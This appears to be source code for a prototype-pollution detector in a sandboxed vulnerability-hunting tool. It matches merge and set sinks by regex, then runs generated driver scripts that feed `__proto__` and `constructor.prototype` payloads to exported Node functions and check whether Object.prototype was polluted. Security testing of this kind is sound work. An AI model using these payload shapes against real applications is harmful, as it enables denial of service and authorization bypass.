import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import type { Exploit } from "../types.js";
import { type Sandbox, bundleForImport } from "../sandbox.js";
import {
  type Attacker,
  type StaticLead,
  nodeDriverImport,
  nodeRunCommand,
  NODE_SOURCE_RE,
  freshMarker,
  nodeExportedNames,
  scanSinkLeads,
  readHandledSources,
} from "./attacker.js";

const HERE = dirname(fileURLToPath(import.meta.url));

// Prototype pollution (CWE-1321): an entrypoint recursively merges or path-assigns keys from an
// attacker-shaped object into a target WITHOUT filtering `__proto__` / `constructor` / `prototype`.
// A payload like `{"__proto__":{"polluted":X}}` then writes X onto `Object.prototype`, so EVERY object
// in the process inherits it — enabling DoS, auth/logic bypass, or gadget-driven RCE downstream. The
// find is a recursive merge/set sink with no key guard; the proof is a FIRED pollution: after driving
// the entrypoint, a brand-new `{}` carries the injected property.

// A recursive-merge / deep-assign / path-set / unflatten sink — where untrusted keys get written into
// a target. Two robust signals: (1) a merge/assign/set/unflatten family NAME, or (2) a `for…in`/`for…of`
// key-iteration loop (the canonical key-copying shape — real sinks like `assign-deep` and
// `arr-flatten-unflatten` reach the write through such a loop, and the older regex missed them because
// it required the bracket-assignment to sit in the same brace-free span as the loop header). This gate
// is deliberately loose: the lane's oracle is a REAL-EFFECT proof (a fresh `{}` is actually polluted),
// so it cannot false-positive on a driven-but-safe file — a guarded merge simply never pollutes.
const MERGE_SINK_RE =
  /\b(?:deep(?:ly)?[_-]?(?:Merge|Assign|Extend|Set|Defaults)|merge(?:Deep|With|Options|Config|Defaults)?|extend|mixin|assign(?:Deep|In)?|setWith|setPath|updateIn|objectAssignDeep|defaultsDeep|unflatten|flatten)\s*\(|\bfor\s*\(\s*(?:const|let|var)\s+[\w$]+\s+(?:in|of)\b/;

/**
 * Drive the entrypoint with prototype-pollution payloads, then check whether a FRESH `{}` inherited the
 * injected marker. Fired = `({})[marker] === marker`, i.e. `Object.prototype` was polluted; a guarded
 * merge that skips the dangerous keys leaves the fresh object clean — the oracle is a REAL effect, never
 * an echo, so it cannot false-positive.
 *
 * Reuses the shared entrypoint-driver's shape-enumeration techniques (robust target resolution across
 * default-function / named / class-method / object-method exports, async-rejection guards, a settle),
 * but with prototype-pollution's own payload set rather than a single tainted string — the real npm
 * sinks (survey #131: 100% function-export) are reached through four distinct shapes:
 *   - object-merge:   `fn({}, {"__proto__":{k:v}})` / `fn({"__proto__":{k:v}})`  (assign-deep, algolia)
 *   - flat dotted-key: `fn({"__proto__.k": v})`                                   (arr-flatten-unflatten)
 *   - path-set triple: `fn({}, "__proto__.k", v)` / `fn({}, ["__proto__",k], v)`  (101/set)
 *   - constructor.prototype variants of each.
 */
function pollutionDriver(moduleRel: string, fnName: string, marker: string): string {
  const mod = JSON.stringify("./" + moduleRel);
  const F = JSON.stringify(fnName);
  const MK = JSON.stringify(marker);
  return `
process.on("unhandledRejection", () => {});
process.on("uncaughtException", () => {});
const MK = ${MK};
${nodeDriverImport(mod)}
function clean(){ try { delete Object.prototype[MK]; delete Object.prototype["p_"+MK]; } catch(e){} }
function polluted(){ const o = {}; return o[MK] === MK || o["p_"+MK] === MK; }
// Fresh payloads per attempt (JSON.parse keeps __proto__ as an OWN key; a flat object carries a dotted
// key literally). Two vectors — __proto__ and constructor.prototype — each in every call shape.
function P_obj(){ return JSON.parse('{"__proto__":{"'+MK+'":"'+MK+'"}}'); }
function P_ctor(){ return JSON.parse('{"constructor":{"prototype":{"'+MK+'":"'+MK+'"}}}'); }
function P_flat(){ const o = {}; o["__proto__."+MK] = MK; return o; }
function P_flatCtor(){ const o = {}; o["constructor.prototype."+MK] = MK; return o; }
// Drive ONE callable across every prototype-pollution call shape; return true as soon as a fresh {} is
// polluted. Async merges are awaited-then-checked via the caller's settle.
function driveFn(fn){
  const attempts = [
    () => fn({}, P_obj()), () => fn(P_obj()), () => fn(P_obj(), {}),
    () => fn({}, P_ctor()), () => fn(P_ctor()),
    () => fn(P_flat()), () => fn({}, P_flat()), () => fn(P_flatCtor()), () => fn({}, P_flatCtor()),
    () => fn({}, "__proto__."+MK, MK), () => fn({}, ["__proto__", MK], MK),
    () => fn({}, "constructor.prototype."+MK, MK), () => fn({}, "__proto__", { [MK]: MK }),
  ];
  for (const a of attempts){
    clean();
    try { const r = a(); if (r && typeof r.then === "function") r.then(() => {}, () => {}); } catch(e){}
    if (polluted()) return true;
  }
  return false;
}
// Enumerate every shape the export can take: a plain function, a class (ctor + own/prototype methods),
// and an object of methods — so a default-function export, a named method, or \`module.exports = { … }\`
// are all reached, not just \`m[name]\`.
function driveTarget(t){
  if (t == null) return false;
  if (typeof t === "function"){
    if (driveFn(t)) return true;
    for (const ctorArgs of [[], [{}]]){
      try {
        const inst = new t(...ctorArgs);
        const proto = Object.getPrototypeOf(inst) || {};
        const methods = [...new Set(Object.getOwnPropertyNames(proto).concat(Object.keys(inst)))]
          .filter((mn) => mn !== "constructor" && typeof inst[mn] === "function");
        for (const mn of methods){ if (driveFn(inst[mn].bind(inst))) return true; }
      } catch(e){}
    }
  }
  if (t && typeof t === "object"){
    for (const k of Object.keys(t)) if (typeof t[k] === "function"){ if (driveFn(t[k].bind(t))) return true; }
  }
  return false;
}
// Resolve candidate targets: the named export, the default export (and its named member), the module
// itself as a function (\`module.exports = fn\`), and the module as an object of methods.
const CANDS = [];
if (m && m[${F}] !== undefined) CANDS.push(m[${F}]);
if (m && m.default !== undefined){ CANDS.push(m.default); if (m.default && m.default[${F}] !== undefined) CANDS.push(m.default[${F}]); }
if (typeof m === "function") CANDS.push(m);
if (m && typeof m === "object") CANDS.push(m);
for (const c of CANDS){ if (driveTarget(c)){ process.stdout.write("PROTO_FIRED marker="+MK); clean(); process.exit(0); } }
await new Promise((r) => setTimeout(r, 300)); // let an async merge land
if (polluted()){ process.stdout.write("PROTO_FIRED marker="+MK); clean(); process.exit(0); }
clean();
process.stdout.write("no-pollution");
`.trim();
}

export class PrototypePollutionAttacker implements Attacker {
  readonly attackClass = "prototype-pollution" as const;
  readonly canaryFixtureDir = resolve(HERE, "..", "..", "fixtures", "prototype-pollution-node");

  handles(file: string): boolean {
    return NODE_SOURCE_RE.test(file);
  }

  staticLeads(source: string): StaticLead[] {
    return scanSinkLeads(source, MERGE_SINK_RE);
  }

  hunt(targetDir: string, files: string[], sandbox: Sandbox): Exploit[] {
    const exploits: Exploit[] = [];
    for (const { file, source } of readHandledSources(targetDir, files, (f) => this.handles(f))) {
      if (!MERGE_SINK_RE.test(source)) continue; // no recursive-merge/set sink here
      // A huge fraction of real pollution libs are `module.exports = function` (a DEFAULT function with
      // no named export — e.g. assign-deep, arr-flatten-unflatten). nodeExportedNames returns [] for
      // those, so drive a synthetic "default": the driver's target-resolution reaches `m.default` /
      // module-as-function regardless of the name, so the default export is still driven.
      const names = nodeExportedNames(source);
      const driveNames = names.length > 0 ? names : ["default"];

      let fired = false;
      for (const name of driveNames) {
        if (fired) break;
        const marker = freshMarker();
        const driverRel = `.raeuber-proto-${marker}.mjs`;
        sandbox.writeFile(driverRel, pollutionDriver(bundleForImport(sandbox, file) ?? file, name, marker));
        const run = sandbox.exec(`${nodeRunCommand(targetDir)} ${driverRel} 2>&1`, 15_000);
        const out = run.stdout + run.stderr;
        if (!out.includes("PROTO_FIRED")) continue;
        exploits.push({
          attackClass: "prototype-pollution",
          proof: "prototype-polluted",
          file,
          line: 1,
          sink: `merge-sink(${name})`,
          summary:
            `Exported \`${name}()\` merges/assigns attacker-controlled keys into a target without filtering \`__proto__\`/\`constructor.prototype\`; a \`{"__proto__":{…}}\` payload polluted \`Object.prototype\` — after the call a fresh \`{}\` inherited the injected property (CWE-1321). Every object in the process is affected (DoS / logic-bypass / gadget-RCE surface).`,
          payload: `${name}({}, JSON.parse('{"__proto__":{"${marker}":"${marker}"}}'))`,
          evidence:
            `driver drove \`${name}()\` with a \`__proto__\`/\`constructor.prototype\` payload; afterwards a ` +
            `brand-new \`{}\` carried the injected marker \`${marker}\` — Object.prototype was polluted:\n` +
            out.slice(0, 500),
        });
        fired = true;
      }
    }
    return exploits;
  }
}
